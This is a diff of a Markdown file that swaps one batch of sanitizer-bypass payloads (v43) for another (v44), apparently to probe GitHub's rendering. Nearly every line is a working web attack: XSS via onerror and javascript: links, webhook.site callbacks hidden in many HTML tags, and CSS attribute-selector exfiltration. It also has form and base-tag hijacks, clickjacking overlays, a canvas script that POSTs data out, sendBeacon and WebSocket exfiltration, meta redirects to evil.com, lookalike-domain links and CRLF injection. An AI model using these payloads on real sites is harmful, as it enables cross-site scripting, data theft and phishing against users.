@@ -1,325 +1,346 @@
-# v43: Ruby/Details/Diff/KBD Security Tests
+# v44: Multi-Vulnerability Hunt
 
-> Inspired by your styling guide - testing those fancy elements!
-
----
-
-## 1. Ruby Annotation Payloads
-
-<!-- Can we hide callbacks in ruby annotations? -->
-
-<ruby>Text<rt><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/ruby-rt-img.gif"></rt></ruby>
-
-<ruby><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/ruby-base-img.gif"><rt>annotation</rt></ruby>
-
-<ruby>Status<rt><a href="javascript:alert(1)">XSS</a></rt></ruby>
-
-<ruby onmouseover="alert(1)">Hover<rt>test</rt></ruby>
-
-<ruby><img src=x onerror=alert(1)><rt>error</rt></ruby>
-
-<ruby>Test<rt style="background:url(https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/ruby-style.gif)">styled</rt></ruby>
-
-<ruby><rp>(<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/ruby-rp.gif"></rp><rt>test</rt><rp>)</rp></ruby>
-
-<ruby>Multi<rt><rt><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/ruby-double-rt.gif"></rt></rt></ruby>
+> Testing ALL vulnerability classes - not just SSRF!
 
 ---
 
-## 2. Details/Summary Payloads
+## 1. Protocol Handler Exploitation
 
-<!-- Collapsible content might bypass sanitizer -->
+<!-- Can we trigger dangerous protocol handlers? -->
 
-<details>
-<summary><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/summary-img.gif"></summary>
-Hidden content
-</details>
+[📧 Click to email](mailto:attacker@evil.com?subject=Leaked&body=Secret%20Data)
 
-<details open>
-<summary>Auto-Open</summary>
-<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/details-open.gif">
-</details>
+[📞 Click to call](tel:+1234567890)
 
-<details>
-<summary onclick="alert(1)">Click Handler</summary>
-Content
-</details>
+[💬 SMS Link](sms:+1234567890?body=Leaked%20Data)
 
-<details>
-<summary><script>alert(1)</script></summary>
-Script in summary
-</details>
+[📱 FaceTime](facetime:attacker@evil.com)
 
-<details>
-<summary>Nested Details</summary>
-<details>
-<summary><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/nested-details.gif"></summary>
-Deep nested
-</details>
-</details>
+[💻 SSH Link](ssh://attacker@evil.com)
 
-<details style="background:url(https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/details-style.gif)">
-<summary>Styled details</summary>
-Content
-</details>
+[📁 FTP Link](ftp://attacker.com/payload)
 
-<details data-x="<img src=https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/details-data.gif>">
-<summary>Data attr</summary>
-Content
-</details>
+[🔗 SFTP](sftp://attacker.com/secret)
+
+[📲 Intent (Android)](intent://evil.com#Intent;scheme=https;package=com.android.chrome;end)
+
+[🍎 iOS Deep Link](shortcuts://run-shortcut?name=malicious)
+
+[🎮 Steam](steam://run/480)
+
+[💬 Discord](discord://invite/malicious)
+
+[📺 Zoom](zoommtg://zoom.us/join?confno=123456789)
+
+[🖥️ TeamViewer](teamviewer10://control?device=123456789)
 
 ---
 
-## 3. KBD Deep Nesting Payloads
+## 2. Link Prefetch/Preload Exploitation
 
-<!-- From your guide - deep nesting might confuse parser -->
+<!-- Can we force browser to prefetch/preconnect to attacker? -->
 
-<kbd>
-<h1><code><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/kbd-h1-code.gif"></code></h1>
-</kbd>
+<link rel="prefetch" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/link-prefetch">
 
-<kbd>
-<kbd>
-<kbd>
-<kbd>
-<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/kbd-nested-4.gif">
-</kbd>
-</kbd>
-</kbd>
-</kbd>
+<link rel="preload" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/link-preload" as="fetch">
 
-<kbd><script>alert(1)</script></kbd>
+<link rel="preconnect" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff">
 
-<kbd onkeydown="alert(1)">Press me</kbd>
+<link rel="dns-prefetch" href="//f2a2ea2c-e29d-454f-890d-6815bd73f9ff.dnshook.site">
 
-<kbd style="background:url(https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/kbd-style.gif)">styled</kbd>
+<link rel="stylesheet" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/link-stylesheet.css">
 
-<kbd>
-<pre>
-<code>
-<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/kbd-pre-code.gif">
-</code>
-</pre>
-</kbd>
+<link rel="import" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/link-import.html">
 
-<kbd><samp><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/kbd-samp.gif"></samp></kbd>
+<link rel="modulepreload" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/module.js">
 
 ---
 
-## 4. Diff Code Block Injection
+## 3. Meta Tag Exploitation
 
-<!-- Can we inject through diff syntax? -->
+<!-- Meta refresh for open redirect -->
 
-```diff
-- <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/diff-minus.gif">
-+ <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/diff-plus.gif">
-! <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/diff-bang.gif">
-@@ <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/diff-at.gif"> @@
-```
+<meta http-equiv="refresh" content="0;url=https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/meta-refresh">
 
-```diff
-- <script>alert(1)</script>
-+ <script>alert(2)</script>
-```
+<meta http-equiv="refresh" content="5;url=https://evil.com">
 
-```diff
-- javascript:alert(1)
-```
+<meta name="referrer" content="unsafe-url">
 
-```html
-<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/codeblock-html.gif">
-```
+<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
 
-```javascript
-document.write('<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/codeblock-js.gif">')
-```
+<meta http-equiv="X-Frame-Options" content="ALLOW-FROM https://evil.com">
+
+<meta http-equiv="Set-Cookie" content="session=hijacked">
+
+<meta http-equiv="Content-Type" content="text/html">
 
 ---
 
-## 5. Align Attribute Chains
+## 4. SVG Use Element for Script Execution
 
-<!-- Nested div align might have quirks -->
+<!-- SVG use can reference external SVGs with scripts -->
 
-<div align="left">
-<div align="center">
-<div align="right">
-<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/triple-align.gif">
-</div>
-</div>
-</div>
+<svg width="100" height="100">
+<use href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/malicious.svg#payload"></use>
+</svg>
 
-<div align="left" onclick="alert(1)">
-<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/align-onclick.gif">
-</div>
+<svg width="100" height="100">
+<use xlink:href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/xlink.svg#x"></use>
+</svg>
 
-<div align="javascript:alert(1)">
-Bad align value
+<svg>
+<image href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/svg-image.gif"></image>
+</svg>
+
+<svg>
+<foreignObject width="100%" height="100%">
+<body xmlns="http://www.w3.org/1999/xhtml">
+<img src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/svg-fo-body2.gif">
+</body>
+</foreignObject>
+</svg>
+
+<svg>
+<script href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/svg-script.js"></script>
+</svg>
+
+<svg><a xlink:href="javascript:alert(1)"><text y="20">Click me</text></a></svg>
+
+---
+
+## 5. CSS-Based Data Exfiltration
+
+<!-- CSS can leak data via background-image on attribute selectors -->
+
+<style>
+input[value^="a"] { background: url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/css-exfil-a); }
+input[value^="b"] { background: url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/css-exfil-b); }
+@import url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/css-import.css);
+* { background: url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/css-wildcard); }
+</style>
+
+<div style="background:url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/inline-style)">Test</div>
+
+<div style="list-style-image:url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/list-style)">Test</div>
+
+<div style="cursor:url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/cursor.cur),auto">Cursor</div>
+
+<div style="content:url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/content)">Content</div>
+
+---
+
+## 6. Open Redirect via Links
+
+<!-- GitHub may follow these as redirects -->
+
+[Protocol-relative redirect](//webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/proto-relative)
+
+[Data URL](data:text/html,<script>location='https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/data-url'</script>)
+
+[Blob URL attempt](blob:https://github.com/12345678-1234-1234-1234-123456789012)
+
+[About URL](about:blank#<script>fetch('https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff')</script>)
+
+[View-source](view-source:https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff)
+
+---
+
+## 7. Clickjacking/UI Redress
+
+<!-- Overlay elements to trick clicks -->
+
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.01;z-index:9999">
+<a href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/clickjack" style="display:block;width:100%;height:100%"></a>
 </div>
 
-<p align="center"><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/p-align.gif"></p>
-
-<center><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/center-tag.gif"></center>
-
----
-
-## 6. Anchor + Image Combos
-
-<!-- Links wrapping images -->
-
-<a href="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/a-href-click">
-<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/a-img.gif">
+<div style="position:absolute;top:100px;left:100px;">
+<a href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/overlay-click">
+<button style="opacity:0.01">Secret Button</button>
 </a>
-
-<a href="javascript:alert(1)"><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/a-js-img.gif"></a>
-
-<a href="data:text/html,<script>alert(1)</script>"><img src="x"></a>
-
-<a href="vbscript:alert(1)"><img src="x"></a>
-
-<a href="//webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/a-proto-relative">Click</a>
-
-<a href="https://github.com" onclick="location='https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/a-onclick'">Hijack</a>
-
-<a href="#" onfocus="alert(1)" autofocus>Focus XSS</a>
+</div>
 
 ---
 
-## 7. SAMP/VAR/CODE Payloads
+## 8. Form Action Hijack
 
-<!-- From your guide's formatting tags -->
+<!-- Forms that submit to attacker -->
 
-<samp><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/samp-img.gif"></samp>
+<form action="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/form-action" method="POST">
+<input name="secret" value="leaked">
+<input type="submit" value="Submit">
+</form>
 
-<var><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/var-img.gif"></var>
+<form id="leak"><input name="x" form="leak"></form>
+<button form="leak" formaction="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/formaction">Click</button>
 
-<code><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/code-img.gif"></code>
-
-<tt><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/tt-img.gif"></tt>
-
-<pre><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/pre-img.gif"></pre>
-
-<output><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/output-img.gif"></output>
+<input type="image" src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/input-image.gif" formaction="https://evil.com">
 
 ---
 
-## 8. List Element Payloads
+## 9. Iframe/Object Embedding
 
-<ul>
-<li><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/li-img.gif"></li>
-</ul>
+<!-- Can we embed external content? -->
 
-<ol>
-<li value="javascript:alert(1)">Bad value</li>
-</ol>
+<iframe src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/iframe"></iframe>
 
-<dl>
-<dt><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/dt-img.gif"></dt>
-<dd><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/dd-img.gif"></dd>
-</dl>
+<iframe srcdoc="<img src=https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/srcdoc-img>"></iframe>
 
-<menu><li><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/menu-li.gif"></li></menu>
+<object data="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/object" type="text/html"></object>
+
+<embed src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/embed" type="text/html">
+
+<applet code="evil" archive="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/applet.jar"></applet>
 
 ---
 
-## 9. Text Formatting + Callbacks
+## 10. Base Tag Hijacking
 
-<b><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/b-img.gif"></b>
+<!-- Change base URL for all relative links -->
 
-<i><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/i-img.gif"></i>
+<base href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/">
 
-<strong><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/strong-img.gif"></strong>
+<a href="relative-link">This should go to webhook if base works</a>
 
-<em><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/em-img.gif"></em>
-
-<mark><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/mark-img.gif"></mark>
-
-<del><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/del-img.gif"></del>
-
-<ins><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/ins-img.gif"></ins>
-
-<s><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/s-img.gif"></s>
-
-<u><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/u-img.gif"></u>
-
-<small><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/small-img.gif"></small>
-
-<big><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/big-img.gif"></big>
-
-<sub><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/sub-img.gif"></sub>
-
-<sup><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/sup-img.gif"></sup>
+<img src="base-hijack.gif">
 
 ---
 
-## 10. Blockquote + Alert Payloads
+## 11. Service Worker Registration
 
-> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/quote-img.gif">
+<!-- Can we register a service worker? -->
 
->> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/nested-quote-img.gif">
-
-> [!NOTE]
-> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/alert-note-img.gif">
-
-> [!WARNING]
-> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/alert-warn-img.gif">
-
-> [!CAUTION]
-> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/alert-caution-img.gif">
-
-> [!TIP]
-> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/alert-tip-img.gif">
-
-> [!IMPORTANT]
-> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/alert-important-img.gif">
+<script>navigator.serviceWorker.register('https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/sw.js')</script>
 
 ---
 
-## 11. HR/BR Edge Cases
+## 12. WebSocket/EventSource
 
-<hr style="background:url(https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/hr-style.gif)">
+<!-- Real-time data exfil -->
 
-<hr onclick="alert(1)">
-
-<br clear="all" style="background:url(https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/br-style.gif)">
-
----
-
-## 12. Figure/Figcaption
-
-<figure>
-<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/figure-img.gif">
-<figcaption><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/figcaption-img.gif"></figcaption>
-</figure>
+<script>
+new WebSocket('wss://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff');
+new EventSource('https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/eventsource');
+</script>
 
 ---
 
-## 13. Picture/Source Elements
+## 13. Portal Element (Chrome)
 
-<picture>
-<source srcset="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/source-srcset.gif">
-<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/picture-img.gif">
-</picture>
+<portal src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/portal"></portal>
 
 ---
 
-## 14. Map/Area Elements
+## 14. Manifest/Icons
 
-<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/map-img.gif" usemap="#testmap">
-<map name="testmap">
-<area shape="rect" coords="0,0,100,100" href="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/area-click">
-<area shape="rect" coords="0,0,100,100" href="javascript:alert(1)">
-</map>
+<link rel="manifest" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/manifest.json">
 
----
+<link rel="icon" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/favicon.ico">
 
-## 15. Abbreviation/DFN
-
-<abbr title="<img src=https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/abbr-title.gif>">XSS</abbr>
-
-<dfn><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/dfn-img.gif"></dfn>
-
-<acronym title="<img src=x onerror=alert(1)>">ABC</acronym>
+<link rel="apple-touch-icon" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/apple-icon.png">
 
 ---
 
-**v43 - Testing styling guide elements for security bypasses**
+## 15. Ping Attribute
+
+<a href="#" ping="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/ping-attr">Click to ping</a>
+
+---
+
+## 16. Video/Audio Poster/Track
+
+<video poster="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/video-poster.gif">
+<source src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/video.mp4">
+<track src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/track.vtt" kind="captions">
+</video>
+
+<audio src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/audio.mp3"></audio>
+
+---
+
+## 17. Template/Slot Content Injection
+
+<template>
+<img src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/template-direct.gif">
+<script>alert(1)</script>
+</template>
+
+<slot name="evil"><img src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/slot.gif"></slot>
+
+---
+
+## 18. Noscript Fallback
+
+<noscript>
+<img src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/noscript-direct.gif">
+<meta http-equiv="refresh" content="0;url=https://evil.com">
+</noscript>
+
+---
+
+## 19. Canvas/WebGL Exfil
+
+<canvas id="c"></canvas>
+<script>
+var c = document.getElementById('c');
+var ctx = c.getContext('2d');
+var img = new Image();
+img.crossOrigin = 'anonymous';
+img.onload = function() {
+  ctx.drawImage(img, 0, 0);
+  fetch('https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/canvas', {
+    method: 'POST',
+    body: c.toDataURL()
+  });
+};
+img.src = 'https://github.com/favicon.ico';
+</script>
+
+---
+
+## 20. Beacon API
+
+<script>navigator.sendBeacon('https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/beacon', 'data')</script>
+
+---
+
+## 21. Relative Path Confusion
+
+<img src="../../../webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/path-traversal.gif">
+
+<img src="//webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/proto-rel-img.gif">
+
+<a href="\\webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/backslash">Backslash</a>
+
+---
+
+## 22. ASCII Smuggling (Lookalike Domains)
+
+<a href="https://ɢithub.com/fake">Fake GitHub (Greek G)</a>
+
+<a href="https://github.cοm/fake">Fake .com (Greek omicron)</a>
+
+<img src="https://ɢithub.com/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/punycode.gif">
+
+---
+
+## 23. BOM/Encoding Tricks
+
+﻿<script>alert(1)</script>
+
+<img src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/bom%ef%bb%bf.gif">
+
+---
+
+## 24. CRLF Injection
+
+<a href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/%0d%0aSet-Cookie:evil=1">CRLF</a>
+
+---
+
+## 25. Simple Working Image (Control)
+
+<img src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/control-img.gif">
+
+---
+
+**v44 - Hunting ALL vulnerabilities, not just SSRF!**
